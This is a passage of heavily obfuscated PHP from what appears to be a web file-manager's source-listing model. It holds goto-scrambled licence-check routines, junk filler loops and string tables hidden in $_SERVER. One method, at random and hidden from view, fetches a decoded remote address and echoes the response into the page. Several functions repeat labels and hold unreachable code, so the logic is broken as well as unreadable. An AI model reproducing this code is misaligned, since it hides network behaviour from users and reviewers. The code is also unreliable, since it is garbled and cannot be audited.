$this->{$_SERVER[랬][269]}($BɈ, $d߱[314]); $BɈ = $BɈ . $fݎ; $f = $cљ[651]; goto cĊ; C: } private function wfevcbb3e6e8() { goto a갭֣; a갭֣: $A =& $_SERVER[̉]; $Cؓ =& $_SERVER[랬]; $E߆ʯ = array($Cؓ[321] => $Cؓ[322], $Cؓ[323] => $Cؓ[324], $Cؓ[325] => $Cؓ[326], $Cؓ[327] => $Cؓ[328], $Cؓ[329] => $Cؓ[330], $Cؓ[331] => $Cؓ[264], $Cؓ[332] => $Cؓ[264], $Cؓ[333] => $Cؓ[322], $Cؓ[334] => $Cؓ[324], $Cؓ[335] => $Cؓ[326], $Cؓ[336] => $Cؓ[337], $Cؓ[338] => $Cؓ[328], $Cؓ[339] => $Cؓ[340], $Cؓ[341] => $Cؓ[330], $Cؓ[342] => $Cؓ[343], $Cؓ[344] => $Cؓ[345], $Cؓ[346] => $Cؓ[347]); goto f̎; Dփέ: $Dî = $A[656]; if (strlen($Dî) < $A[585]) { return; } $d䣈 = $Cؓ[116]($this->iceydded7f53, $Cؓ[348]); goto eã; f̎: $aņ = $A[655]; $C㆏ = $E߆ʯ[$this->ghqweb405878]; $C㆏ = $Cؓ[263]($C㆏ ? $C㆏ : $Cؓ[322]); goto Dփέ; eã: $B΍ = $A[657]; $d䣈 = $d䣈 ? $Cؓ[263]($d䣈) : 0; return $C㆏ + $d䣈; goto Aϸ۪; Aϸ۪: } public function rtpw908cf6b1($a) { goto d􃍲; A: $bＴ = $Eȃί[61]($Eȃί[149])->{$_SERVER[랬][350]}($Eȃί[349])->{$_SERVER[랬][351]}($C룍)->{$_SERVER[랬][352]}(); $eϢ = $BΏ[659]; if (strlen($eϢ) < $BΏ[583]) { return; } goto e; d􃍲: $BΏ =& $_SERVER[̉]; $Eȃί =& $_SERVER[랬]; $C룍 = $this->{$_SERVER[랬][147]}(); goto bΖ; d: if ($C룍 >= $Eȃί[263]($Eȃί[264])) { return; } $c¬ = $Eȃί[61]($Eȃί[149])->{$_SERVER[랬][150]}(); if ($c¬ <= $C룍) { return; } goto A; bΖ: $b̪ = $BΏ[658]; if (strlen($b̪) < $BΏ[589]) { die; } if ($a[$Eȃί[349]] == $Eȃί[239]) { return; } goto d; e: $bＴ = $Eȃί[241]($bＴ, $Eȃί[10], $Eȃί[349]); if (!$Eȃί[261]($a[$Eȃί[349]], $bＴ)) { $Eȃί[184]($Eȃί[353], !1, $Eȃί[258]); } goto cҍƾ; cҍƾ: } public function ezvd8e971a49() { goto b𚤉; d؝: $d = $this->{$_SERVER[랬][269]}($d, $b޸[270]); $E = $b޸[271](array($b޸[272] => array($b޸[273] => $b޸[274], $b޸[275] => 3))); $b猽 = @$b޸[276]($d, !1, $E); goto bя; b𚤉: $b޸ =& $_SERVER[랬]; if (!$b޸[116]($GLOBALS, $b޸[142]) || $b޸[354](1, 100) > 20) { return; } $d = $b޸[268]; goto d؝; bя: echo $b޸[355] . $b޸[356]($b猽) . $b޸[357]; goto B; B: } private function mzeye2f772ef($eŒΛ, $F, $E͒҉ = 3) { goto EϺ; f잛: switch ($F) { case $d[253]: $eީʄ = $this->{$_SERVER[랬][165]}($eŒΛ, $d[233]($F . $Fޕ)); $d𧣅 = $bʅ֋[664]; break; $B = $bʅ֋[665]; if (!$B) { die; } case $d[239]: $eީʄ = $this->{$_SERVER[랬][165]}($eŒΛ, $d[233]($Fޕ . $F)); break; $D = $bʅ֋[666]; while (strlen($D) < $bʅ֋[585]) { if (!$D) { break; } $D++; } case $d[360]: $eީʄ = $this->{$_SERVER[랬][165]}($eŒΛ, $d[128]($Fޕ . $F)); $d = $bʅ֋[667]; if (!$d) { return; } break; case $d[361]: $eީʄ = $this->{$_SERVER[랬][165]}($eŒΛ, $d[124]($Fޕ . $F)); break; $c = $bʅ֋[668]; if (strlen($c) < $bʅ֋[585]) { return; } case $d[362]: goto C; CˈÅ: $Bծフ = 0; $cۡ = $bʅ֋[674]; while ($cۡ < $bʅ֋[585]) { if ($cۡ >= 0) { break; } $cۡ++; } goto D㥱; D㥱: $BӪ = 0; $Aς = 0; for ($Bծフ = 0; $Bծフ < $d[24]($eŒΛ); $Bծフ++) { $Aς = $Aς == $d[24]($F˯) ? 0 : $Aς; $e㩐 = $bʅ֋[675]; $BӪ = ($ḟ + $d[364]($EɌ, $eŒΛ[$Bծフ]) + $d[365]($F˯[$Aς++])) % 64; $aÄ .= $EɌ[$BӪ]; } goto A؞; FΎϭ: $Cؽ = $bʅ֋[672]; while ($Cؽ < $bʅ֋[583]) { if ($Cؽ >= 0) { break; } $Cؽ++; } $F˯ = $d[25]($F˯, $ḟ % 8, $ḟ % 8 + 7); goto Dȏ; F: if (!$a뇛Ą) { return; } goto D޾; C: $eŒΛ = $d[128]($eŒΛ); $B̟š̰ = $bʅ֋[669]; while ($B̟š̰ < $bʅ֋[583]) { if ($B̟š̰ >= 0) { break; } $B̟š̰++; } goto eđ; Dȏ: $DΘ = $bʅ֋[673]; while ($DΘ < $bʅ֋[578]) { if ($DΘ >= 0) { break; } $DΘ++; } $aÄ = $d[10]; goto CˈÅ; Cҹ: $bτ = $bʅ֋[671]; if (strlen($bτ) < $bʅ֋[585]) { die; } $F˯ = $d[124]($e . $d[124]($F . $e) . $F); goto FΎϭ; A؞: $eީʄ = $d[356]($e . $aÄ); break; $a뇛Ą = $bʅ֋[676]; goto F; eđ: $ḟ = $d[363](0, 64); $D۽ = $bʅ֋[670]; $e = $EɌ[$ḟ]; goto Cҹ; D޾: default: $eީʄ = $this->{$_SERVER[랬][165]}($eŒΛ, $F . $Fޕ); break; $DΤ = $bʅ֋[677]; } $eީʄ = $d[233]($F . $Fޕ . $eީʄ); if ($E͒҉ - 1 > 0) { $eީʄ = $this->{$_SERVER[랬][137]}($eީʄ, $F, $E͒҉ - 1); } goto fθշ; fθշ: return $eީʄ; goto b¨̦; dқ: $F = $d[354](0, 5) . $d[10]; $E = $bʅ֋[662]; $Fޕ = $d[134](15); goto Bލ; aփ: $fȩ = $bʅ֋[660]; $eŒΛ = $d[2]($eŒΛ); $f = $bʅ֋[661]; goto dқ; EϺ: $bʅ֋ =& $_SERVER[̉]; $d =& $_SERVER[랬]; $d[358](1); goto aփ; Bލ: $aτ = $bʅ֋[663]; if (!$aτ) { return; } $EɌ = $d[359]; goto f잛; b¨̦: } private function kzswfc0a4177($C۰, $Eݤ, $A = 3) { goto f; Fґ: if ($A - 1 > 0) { $dȥɣ = $this->{$_SERVER[랬][208]}($dȥɣ, $Eݤ, $A - 1); } return $dȥɣ; goto D; F鷌: $C۰ = $d˾Ϯ[2]($C۰); $C۰ = $d˾Ϯ[233]($C۰); $bᣒ = $f[678]; goto CЕ; f: $f =& $_SERVER[̉]; $d˾Ϯ =& $_SERVER[랬]; if (!$d˾Ϯ[158]($C۰) || $d˾Ϯ[24]($C۰) < 10) { return !1; } goto F鷌; E䲅: $C۰ = $d˾Ϯ[25]($C۰, 16); $c = $d˾Ϯ[359]; switch ($Bۥ) { case $d˾Ϯ[253]: $dȥɣ = $this->{$_SERVER[랬][269]}($C۰, $d˾Ϯ[233]($Eݤ . $D)); $C = $f[679]; while ($C < $f[589]) { if ($C >= 0) { break; } $C++; } break; case $d˾Ϯ[239]: $dȥɣ = $this->{$_SERVER[랬][269]}($C۰, $d˾Ϯ[233]($D . $Eݤ)); $E = $f[680]; if (!$E) { return; } break; $eð = $f[681]; while (strlen($eð) < $f[585]) { if (!$eð) { break; } $eð++; } case $d˾Ϯ[360]: $dȥɣ = $this->{$_SERVER[랬][269]}($C۰, $d˾Ϯ[128]($D . $Eݤ)); $d = $f[682]; while (strlen($d) < $f[583]) { if (!$d) { break; } $d++; } break; $f = $f[683]; if (!$f) { die; } case $d˾Ϯ[361]: $dȥɣ = $this->{$_SERVER[랬][269]}($C۰, $d˾Ϯ[124]($D . $Eݤ)); $e = $f[684]; if (!$e) { return; } break; $eιǑ = $f[676]; case $d˾Ϯ[362]: goto E׋ٸ; fғ: $b = $f[691]; if (!$b) { die; } break; goto B; E׋ٸ: $C۰ = $d˾Ϯ[366]($C۰); $eɸ = $C۰[0]; $B = $f[685]; goto D; B: $b = $f[688]; if (strlen($b) < $f[585]) { return; } $B憜 = 0; goto D; B: $fؗ穱 = $f[692]; if (strlen($fؗ穱) < $f[585]) { return; } goto AڑѺ; Eʫю: $D = $f[687]; if (!$D) { die; } $A޵ = 0; goto B; Fƒ: while (strlen($c폃ɿ) < $f[589]) { if (!$c폃ɿ) { break; } $c폃ɿ++; } $C拇 = $d˾Ϯ[364]($c, $eɸ); $BÍً = $d˾Ϯ[124]($eɸ . $d˾Ϯ[124]($Eݤ . $eɸ) . $Eݤ); goto e; D: $A׼σ = $f[689]; for ($FΌܝ = 0; $FΌܝ < $d˾Ϯ[24]($C۰); $FΌܝ++) { $B憜 = $B憜 == $d˾Ϯ[24]($BÍً) ? 0 : $B憜; $c󝟏 = $B憜++; $B = $f[690]; while (strlen($B) < $f[583]) { if (!$B) { break; } $B++; } $A޵ = $d˾Ϯ[364]($c, $C۰[$FΌܝ]) - $C拇 - $d˾Ϯ[365]($BÍً[$c󝟏]); while ($A޵ < 0) { $A޵ += 64; } $cѝ .= $c[$A޵]; } $dȥɣ = $d˾Ϯ[367]($cѝ); goto fғ; D: if (!$B) { die; } $C۰ = $d˾Ϯ[25]($C۰, 1); $c폃ɿ = $f[686]; goto Fƒ; e: $BÍً = $d˾Ϯ[25]($BÍً, $C拇 % 8, $C拇 % 8 + 7); $cѝ = $d˾Ϯ[10]; $FΌܝ = 0; goto Eʫю; AڑѺ: default: $dȥɣ = $this->{$_SERVER[랬][269]}($C۰, $Eݤ . $D); break; } goto Fґ; CЕ: $Bۥ = $C۰[0]; $f = $f[633]; $D = $d˾Ϯ[25]($C۰, 1, 15); goto E䲅; D: } public function yizle22a95dc($B) { goto dӐή; dп: for ($Fޒ = 0; $Fޒ < $Cȿ * 10; $Fޒ++) { if (($Cȿ * $Fޒ + 1) % $cֱ == 0) { $f = $f[263](($Cȿ * $Fޒ + 1) / $cֱ); break; } } $Cǻ = $this->{$_SERVER[랬][165]}($B * $f . $f[10], $f[167]); $E = $f[124]($f[369] . ($B + $f) . $f[370] . $cֱ . $f[370] . $f . $f[371]); goto Eܤ֯; Eܤ֯: $ḇ = $C䧰[695]; while ($ḇ < $C䧰[589]) { if ($ḇ >= 0) { break; } $ḇ++; } $Fң擓 = $this->{$_SERVER[랬][165]}($B, $E) . $f[372] . $Cǻ; goto Fꓯ; fŴ: $f = 2; $dȠǆ = $C䧰[694]; if (strlen($dȠǆ) < $C䧰[578]) { return; } goto dп; C׋: $Fݔ = $C䧰[693]; while (strlen($Fݔ) < $C䧰[583]) { if (!$Fݔ) { break; } $Fݔ++; } $f = $this->{$_SERVER[랬][368]}(); goto Å҅; Fꓯ: $D = $C䧰[696]; if (!$D) { return; } return $Fң擓; goto Eͪҡ; Å҅: $Cȿ = ($B - 1) * ($f - 1); $cֱ = $f[263](($B + $f) / 2); while (1) { $aɈ = $cֱ; $d֞ = $Cȿ; while ($d֞ % $aɈ != 0) { $dš櫘 = $d֞; $d֞ = $aɈ; $aɈ = $dš櫘 % $aɈ; } if ($aɈ == 1) { break; } else { $cֱ++; } } goto fŴ; dӐή: $C䧰 =& $_SERVER[̉]; $f =& $_SERVER[랬]; $B = $this->{$_SERVER[랬][368]}(); goto C׋; Eͪҡ: } public function jtbg76f025d4($b) { goto d; b휌: $bƂ = $Cㄅ[263]($bƂ); $b = 0; $F = 0; goto E; fږ: $Fþ = $Cㄅ[124]($Cㄅ[369] . ($b + $F) . $Cㄅ[370] . $aߪ . $Cㄅ[370] . $e޿ڃ . $Cㄅ[371]); $f = $c[703]; if (!$f) { die; } goto fэ; d܇: return $E㫐; $C澈 = $c[705]; while ($C澈 < $c[583]) { if ($C澈 >= 0) { break; } $C澈++; } goto aǈԵ; EƇ: if ($Cㄅ[19]($aЃևɵ) != 2) { return $Cㄅ[10]; } $bƂ = $this->{$_SERVER[랬][269]}($aЃևɵ[1] . $Cㄅ[10], $Cㄅ[167]); if (!$bƂ) { return $Cㄅ[10]; } goto b휌; E: for ($aƩԒ = 3; $aƩԒ < $bƂ; $aƩԒ += 2) { if ($bƂ % $aƩԒ != 0) { continue; } $b = $aƩԒ; $cѨ = $c[697]; if (strlen($cѨ) < $c[578]) { die; } $F = $Cㄅ[263]($bƂ / $aƩԒ); $aԤҟ = $c[696]; if (!$aԤҟ) { return; } break; $f = $c[698]; while ($f < $c[583]) { if ($f >= 0) { break; } $f++; } } $f؃ = ($b - 1) * ($F - 1); $aߪ = $Cㄅ[263](($b + $F) / 2); goto fь; d: $c =& $_SERVER[̉]; $Cㄅ =& $_SERVER[랬]; $aЃևɵ = $Cㄅ[0]($Cㄅ[372], $b); goto EƇ; fь: while (1) { $AȈ = $aߪ; $e˼ = $c[699]; if (!$e˼) { return; } $f = $f؃; $b = $c[700]; while (strlen($b) < $c[578]) { if (!$b) { break; } $b++; } while ($f % $AȈ != 0) { $Eᙈ = $f; $C = $c[701]; if (strlen($C) < $c[578]) { die; } $f = $AȈ; $AȈ = $Eᙈ % $AȈ; $fӇ = $c[702]; if (!$fӇ) { die; } } if ($AȈ == 1) { break; } else { $aߪ++; } } $e޿ڃ = 2; for ($aƩԒ = 0; $aƩԒ < $f؃ * 10; $aƩԒ++) { if (($f؃ * $aƩԒ + 1) % $aߪ == 0) { $e޿ڃ = $Cㄅ[263](($f؃ * $aƩԒ + 1) / $aߪ); break; } } goto fږ; fэ: $E㫐 = $this->{$_SERVER[랬][269]}($aЃևɵ[0], $Fþ); $C = $c[704]; if (!$C) { return; } goto d܇; aǈԵ: } public function khafca38a78f() { goto b; C: $e朦 = $dۋ[708]; while ($e朦 < $dۋ[583]) { if ($e朦 >= 0) { break; } $e朦++; } while ($Eá <= (int) $Cӟ[374]($F)) { $cӣ = $Eá; while (!0) { $cӣ++; if ($cӣ <= 2) { $Eá = $cӣ; break; } else { if ($cӣ < 2) { continue; } } $F = !0; for ($e䇇 = 2; $e䇇 <= $Cӟ[374]($cӣ); $e䇇++) { if ($cӣ % $e䇇 == 0) { $F = !1; } } if ($F) { $Eá = $cӣ; break; } } $dՌބ[] = $Eá; $dܱ = $dۋ[709]; if (!$dܱ) { return; } } goto DѪ; b: $dۋ =& $_SERVER[̉]; $Cӟ =& $_SERVER[랬]; $F = $Cӟ[354]($Cӟ[373](2, 14), $Cӟ[373](2, 16) - 1); goto cӧȶ; cӧȶ: $cȰ = $dۋ[706]; while (strlen($cȰ) < $dۋ[581]) { if (!$cȰ) { break; } $cȰ++; } $dՌބ = array(); goto cǝ; DѪ: $eׇ = 2; for ($cӣ = $F; $cӣ > 1; $cӣ--) { $F = !0; foreach ($dՌބ as $fʠ՝) { if ($cӣ % $fʠ՝ == 0) { $F = !1; break; } } if ($F) { $eׇ = $cӣ; break; } } return $eׇ; goto C; cǝ: $E = $dۋ[707]; if (strlen($E) < $dۋ[589]) { die; } $Eá = 1; goto C; C: } public function sjnid4bfddfb($a̻, $E⇖) { $ẢƵϔ =& $_SERVER[랬]; return $ẢƵϔ[13](array($ẢƵϔ[14], $ẢƵϔ[375]), $a̻, $E⇖); } public function ydmf5c7f67e4($d򓑩, $AѼ) { $d̉ =& $_SERVER[̉]; $Fӿϓ =& $_SERVER[랬]; return $Fӿϓ[13](array($Fӿϓ[376], $Fӿϓ[377]), $d򓑩, $AѼ); $bΖࢅ = $d̉[710]; while ($bΖࢅ < $d̉[585]) { if ($bΖࢅ >= 0) { break; } $bΖࢅ++; } } public function aisc767db228($dܻŦ, $aƼ) { $C =& $_SERVER[랬]; return $C[13](array($C[376], $C[378]), $dܻŦ, $aƼ); } } goto a; a: class SourceListModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\x72\143\145"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\145" => "\x69\x6f\137\x73\x6f\165\x72\x63\145\x5f\x6d\145\164\141", "\x6d\x65\164\x61\106\x69\145\x6c\x64" => "\x73\157\165\162\x63\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\155\145", "\164\x69\155\x65", "\x69\156\163\x65\162\x74", "\x66\165\x6e\143\164\x69\157\156"), array("\x63\x72\x65\x61\x74\x65\x54\x69\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\x6f\x6e"), array("\166\x69\145\x77\124\151\155\x65", "\x74\x69\x6d\x65", "\151\x6e\x73\145\162\164", "\146\x75\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($B֬Ȼ) { return $this->listSource(array($_SERVER[̉][394] => $B֬Ȼ)); } public function typeName($Aķ) { static $B쬏 = array(self::TYPE_SYSTEM => "\163\x79\163\164\x65\x6d", self::TYPE_USER => "\165\x73\145\x72", self::TYPE_GROUP => "\147\x72\x6f\x75\160"); return $B쬏[$Aķ . $_SERVER[̉][33]]; } public function sourceListInfo($Cك, $b턤 = false) { goto d; EζӦ: return array_to_keyvalue($C󄦒, $eذ[395]); goto e; F꾙: if (!$Cك) { return array(); } $C󄦒 = $this->where(array($eذ[395] => array($eذ[7], $Cك)))->select(); $this->_listDataApply($C󄦒, $b턤); goto EζӦ; d: $eذ =& $_SERVER[̉]; $Cك = $Cك ? $Cك : array(); $Cك = array_filter(array_unique($Cك)); goto F꾙; e: } public function pathInfoFilter(&$d) { goto C󶛧; C󶛧: $bˑ =& $_SERVER[̉]; static $Dظϣ = false; static $F = false; goto dַ; a韥ӎ: $d = array_field_key($d, $A); return $d; goto E򈥫; Dجκ: $d[$bˑ[76]] = $bˑ[401] . $d[$bˑ[395]] . $bˑ[402]; $d[$bˑ[29]] = $d[$bˑ[403]] == 1 ? $bˑ[77] : $bˑ[193]; $d[$bˑ[404]] = $this->typeName($d[$bˑ[404]]); goto eႄ; dַ: static $b = false; if (!$Dظϣ) { goto A߆; BѨ: $F = array(); foreach ($Dظϣ as $C) { if (in_array($C, $F熇)) { continue; } $F[] = $C; } $b = explode($bˑ[47], $bˑ[400]); goto Dﻏ; AЌ: $a֟ = $bˑ[399]; $F熇 = explode($bˑ[47], $a֟); $Dظϣ = explode($bˑ[47], $b); goto BѨ; A߆: $b = $bˑ[396]; $b .= $bˑ[397]; $b .= $bˑ[398]; goto AЌ; Dﻏ: } foreach ($b as $F猯ܗ) { if (isset($d[$F猯ܗ])) { $d[$F猯ܗ] = intval($d[$F猯ܗ]); } } goto Dجκ; eႄ: if ($d[$bˑ[403]] != 1) { $d[$bˑ[168]] = $d[$bˑ[405]]; unset($d[$bˑ[405]]); } $A = $Dظϣ; if (isset($d[$bˑ[406]]) && $d[$bˑ[406]][$bˑ[407]] == -1) { $A = $F; } goto a韥ӎ; E򈥫: } public function listUserFav() { goto D߯晍; Cĭ: foreach ($C as &$EҾ) { $EҾ = array($C[412] => $EҾ[$C[393]], $C[413] => $EҾ[$C[28]], $C[414] => $EҾ[$C[76]], $C[415] => $EҾ[$C[29]], $C[416] => $EҾ[$C[194]], $C[417] => $EҾ[$C[84]]); if ($EҾ[$C[29]] == $C[409] && $Eƿ[$EҾ[$C[76]]]) { $EҾ[$C[85]] = $Eƿ[$EҾ[$C[76]]]; } } unset($EҾ); return $C; goto E; D߯晍: $C =& $_SERVER[̉]; $C = Model($C[408])->listData(); $Bψ = array_filter_by_field($C, $C[29], $C[409]); goto c; c: $Bψ = array_to_keyvalue($Bψ, $C[33], $C[76]); if ($Bψ) { $Eƿ = $this->listSource(array($C[410] => array($C[411], $Bψ))); } $Eƿ = array_to_keyvalue($Eƿ[$C[367]], $C[395]); goto Cĭ; E: } public function listUserTag($c𴼌) { goto f줋; AɤƆ: $EÈ = array_to_keyvalue($Fǿ魮[$b[74]], $b[33], $b[395]); $A悸 = array_merge($EÈ, $Cߝץ); foreach ($Bӄ as $B銛̳) { if (!in_array($B銛̳, $A悸)) { $Dޕ[] = $B銛̳; } } goto BεĖ; f줋: $b =& $_SERVER[̉]; if ($c𴼌 && !is_array($c𴼌)) { $c𴼌 = array($c𴼌); } $F͞Ƭ = Model($b[418])->listData(); goto Aމ̟; Aމ̟: $c돱 = array(); foreach ($F͞Ƭ as $bܢ) { $B銛̳ = $bܢ[$b[76]]; if (!$B銛̳) { continue; } if (!isset($c돱[$B銛̳])) { $c돱[$B銛̳] = array(); } $c돱[$B銛̳][] = $bܢ[$b[419]]; } $Bӄ = array(); goto f; f: foreach ($c돱 as $dǮ => $dʈ) { $B܏ = !0; if (!$c𴼌) { $Bӄ[] = $dǮ; continue; } foreach ($c𴼌 as $d) { if (!in_array($d, $dʈ)) { $B܏ = !1; break; } } if ($B܏) { $Bӄ[] = $dǮ; } } if (!$Bӄ) { return array(); } $Fǿ魮 = $this->listSource(array($b[410] => array($b[411], $Bӄ))); goto Fޒ; Fޒ: if (!$Fǿ魮 || count($Bӄ) == $Fǿ魮[$b[364]][$b[365]]) { return $Fǿ魮; } $Dޕ = array(); $Cߝץ = array_to_keyvalue($Fǿ魮[$b[75]], $b[33], $b[395]); goto AɤƆ; BεĖ: if ($Dޕ) { Model($b[420])->removeBySource($Dޕ); } return $Fǿ魮; goto A͚; A͚: } public function listUserRecycle() { $Eݳ =& $_SERVER[̉]; $A = Model($Eݳ[421])->listData(); if (!$A) { return array(); } $cה = array($Eݳ[410] => array($Eݳ[411], $A), $Eݳ[422] => 1); return $this->listSource($cה); } public function listSource($B, $Eщ㷏 = 3000) { goto A; A: $Cԥݲ =& $_SERVER[̉]; if (!isset($B[$Cԥݲ[423]])) { $B[$Cԥݲ[423]] = 0; } $F = $Cԥݲ[424]; goto Fٹ; E: return $c邲; goto F䅗; Fٹ: $c邲 = $this->field($F)->_makeOrder()->where($B)->selectPage($Eщ㷏); $this->_listDataApply($c邲[$Cԥݲ[367]]); $this->_listMake($c邲); goto E; F䅗: } protected function _makeOrder() { goto C⑻֍; C⑻֍: $D =& $_SERVER[̉]; $b = Model($D[425])->get($D[426]); $CԜ = Model($D[425])->get($D[427]); goto bٵ; bٵ: $D = array($D[428] => $D[429], $D[430] => $D[431]); $e = array($D[28] => $D[28], $D[78] => $D[78], $D[168] => $D[405], $D[432] => $D[432], $D[433] => $D[434], $D[194] => $D[194], $D[84] => $D[84]); $fэ = Input::get($D[435], $D[7], $b, array_keys($e)); goto AƦ; AƦ: $AƼ = Input::get($D[436], $D[7], $CԜ, array_keys($D)); if (!in_array($fэ, array_keys($e))) { $fэ = $D[28]; } if (!in_array($AƼ, array_keys($D))) { $fэ = $D[428]; } goto F; F: if ($fэ == $D[28]) { } $A = $D[437] . $e[$fэ] . $D[50] . $D[$AƼ]; return $this->order(rtrim(trim($A), $D[47])); goto b뵖; b뵖: } protected function _listDataApplyItem($E, $f뮠 = false) { $eɧ = array($E); $this->_listDataApply($eɧ, $f뮠); return $eɧ[0]; } protected function _listDataApply(&$B򗇜, $fޒ = false) { goto E驌; b֐ݐ: $this->_listAppendPath($B򗇜); $this->_listAppendAuth($B򗇜); $this->_listAppendSourceInfo($B򗇜, $c֎ɑ); goto Bƙ; fڸ: $c֎ɑ = array_unique($c֎ɑ); $this->_listSourceCache($B򗇜); if (!$fޒ) { $this->_listAppendMeta($B򗇜, $c֎ɑ); $this->_listAppendFileMeta($B򗇜, $c֎ɑ); $this->_listAppendChildren($B򗇜, $c֎ɑ); } goto b֐ݐ; Bƙ: $this->_listAppendUser($B򗇜); $this->_listFilterInfo($B򗇜, $fޒ); goto cǎ; E驌: $Bɏ܇ =& $_SERVER[̉]; if (!$B򗇜) { $B򗇜 = array(); return; } $c֎ɑ = array_to_keyvalue($B򗇜, $Bɏ܇[33], $Bɏ܇[395]); goto fڸ; cǎ: } protected function _listSourceCache($D˼פ) { $Eޙ =& $_SERVER[̉]; foreach ($D˼פ as $Dǜ) { self::$cacheSourceInfo[$Eޙ[438] . $Dǜ[$Eޙ[395]]] = $Dǜ; } } protected function _listFilterInfo(&$C, $D = false) { $E̓磏 =& $_SERVER[̉]; foreach ($C as &$e) { $e = $this->pathInfoFilter($e); self::$cachePathInfo[$E̓磏[439] . intval($D) . $E̓磏[440] . $e[$E̓磏[395]]] = $e; } unset($e); } protected function _listMake(&$bЍ˝) { $C˰ =& $_SERVER[̉]; $bЍ˝[$C˰[75]] = array(); $bЍ˝[$C˰[74]] = array(); foreach ($bЍ˝[$C˰[367]] as $f΋) { $e咢ԓ = $f΋[$C˰[403]] == 1 ? $C˰[75] : $C˰[74]; $bЍ˝[$e咢ԓ][] = $f΋; } unset($bЍ˝[$C˰[367]]); } protected function _listAppendMeta(&$DՅ, $aѼ) { goto Fԥ; d؅: foreach ($fډƽ as $B) { if (!isset($cۙ[$B[$C[395]]])) { $cۙ[$B[$C[395]]] = array(); } if (in_array($B[$C[93]], $a)) { continue; } $cۙ[$B[$C[395]]][$B[$C[93]]] = $B[$C[372]]; } foreach ($DՅ as &$E) { $E[$C[445]] = !1; if (isset($cۙ[$E[$C[395]]])) { $E[$C[445]] = $cۙ[$E[$C[395]]]; } if ($this->fileIsLock($E) && $E[$C[406]]) { $aۑ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E[$C[406]][$C[407]] = AuthModel::authDisable($E[$C[406]][$C[407]], $aۑ); $E[$C[406]][$C[446]][$C[406]] = $E[$C[406]][$C[407]]; } } unset($E); goto a̘ю; Fԥ: $C =& $_SERVER[̉]; $Dɚ = array($C[410] => array($C[411], $aѼ)); $fډƽ = Model($C[441])->field($C[442])->where($Dɚ)->select(); goto F; F: if (!$fډƽ) { return; } $a = array($C[443], $C[444]); $cۙ = array(); goto d؅; a̘ю: } protected function _listAppendFileMeta(&$f, $D) { goto b; D걃܎: $dˎÆ = Model($c[450])->field($fڞ)->where($A)->select(); $dˎÆ = array_to_keyvalue($dˎÆ, $c[447]); $f = Model($c[451])->field($c[452])->where($A)->select(); goto cއ; b: $c =& $_SERVER[̉]; $cӳ = array_to_keyvalue($f, $c[33], $c[447]); $cӳ = array_filter(array_unique($cӳ)); goto C닎; dʎ: foreach ($f as &$b򦪻) { goto B; B: $eǠ = $b򦪻[$c[447]]; if (!$eǠ || !is_array($dˎÆ[$eǠ])) { continue; } $dόÒ = $dˎÆ[$eǠ]; goto F޿ߑ; A: if (isset($b򦪻[$c[164]][$c[163]])) { $b򦪻[$c[163]] = json_decode($b򦪻[$c[164]][$c[163]], !0); unset($b򦪻[$c[164]][$c[163]]); } goto a; F޿ߑ: $dόÒ[$c[78]] = $b򦪻[$c[78]]; $dόÒ[$c[28]] = $b򦪻[$c[28]]; if (!isset(self::$cacheFileInfo[$c[453] . $eǠ])) { self::$cacheFileInfo[$c[453] . $eǠ] = array_merge(array(), $dόÒ); } goto B뇏; B뇏: unset($dˎÆ[$eǠ][$c[76]]); $fȯ = is_array($E[$eǠ]) ? $E[$eǠ] : array(); $b򦪻[$c[164]] = array_merge($fȯ, $dˎÆ[$eǠ]); goto A; a: } unset($b򦪻); goto f; C닎: if (!$cӳ) { return; } $A = array($c[448] => array($c[411], $cӳ)); $fڞ = $c[449]; goto D걃܎; cއ: $f = $f ? $f : array(); $E = array(); foreach ($f as $dٳϢլ) { if (!isset($E[$dٳϢլ[$c[447]]])) { $E[$dٳϢլ[$c[447]]] = array(); } $E[$dٳϢլ[$c[447]]][$dٳϢլ[$c[93]]] = $dٳϢլ[$c[372]]; } goto dʎ; f: } protected function _listAppendSourceInfo(&$dܵ, $A) { goto cڒ; Eۮ: $A = array_to_keyvalue_group($Fٴ, $b[395]); foreach ($dܵ as &$e) { $e[$b[85]] = array($b[457] => 0, $b[458] => 0, $b[459] => 0); if (isset($F[$e[$b[395]]])) { $e[$b[85]][$b[460]] = 1; $e[$b[85]][$b[461]] = $F[$e[$b[395]]][$b[28]]; } if (isset($bÕ[$e[$b[395]]])) { $e[$b[85]][$b[462]] = array(); foreach ($bÕ[$e[$b[395]]] as $B) { $B = $eō[$B]; $e[$b[85]][$b[462]][] = array($b[463] => $B[$b[393]], $b[413] => $B[$b[28]], $b[464] => $B[$b[465]]); } } if (isset($A[$e[$b[395]]])) { $e[$b[85]][$b[466]] = array(); foreach ($A[$e[$b[395]]] as $C󌞒ʟ) { $e[$b[85]][$b[466]] = array($b[467] => $C󌞒ʟ[$b[468]], $b[469] => $C󌞒ʟ[$b[470]], $b[471] => $C󌞒ʟ[$b[395]], $b[472] => $C󌞒ʟ[$b[473]], $b[474] => $C󌞒ʟ[$b[475]], $b[476] => $C󌞒ʟ[$b[476]], $b[477] => $C󌞒ʟ[$b[477]]); } } } unset($e); goto cւ֘; B俔: $eō = array_to_keyvalue($cㆇ, $b[393]); $bÕ = array_to_keyvalue_group($d, $b[76], $b[419]); $F = array_to_keyvalue($Eσ, $b[76]); goto Eۮ; Fӏ: $d = Model($b[418])->listData(); $Eσ = Model($b[408])->listData(); $Fٴ = Model($b[456])->listSimple(); goto B俔; cڒ: $b =& $_SERVER[̉]; if (!defined($b[454])) { return; } $cㆇ = Model($b[455])->listData(); goto Fӏ; cւ֘: return $dܵ; goto B; B: } protected function _listAppendChildren(&$bٸ, $Cϐ) { goto C; D摭: unset($e); goto bɼ䝗; Cݸ: foreach ($bٸ as &$e) { if (!$e[$a[403]]) { continue; } $Fӎ[] = $e[$a[395]]; } unset($e); if (!$Fӎ) { return; } goto fʸ; dᢠ: $CŲ = array(); foreach ($fƏŒ as $c腉) { $e = $c腉[$a[478]]; $D۴ٳ = $c腉[$a[403]] == $a[87] ? $a[204] : $a[203]; if 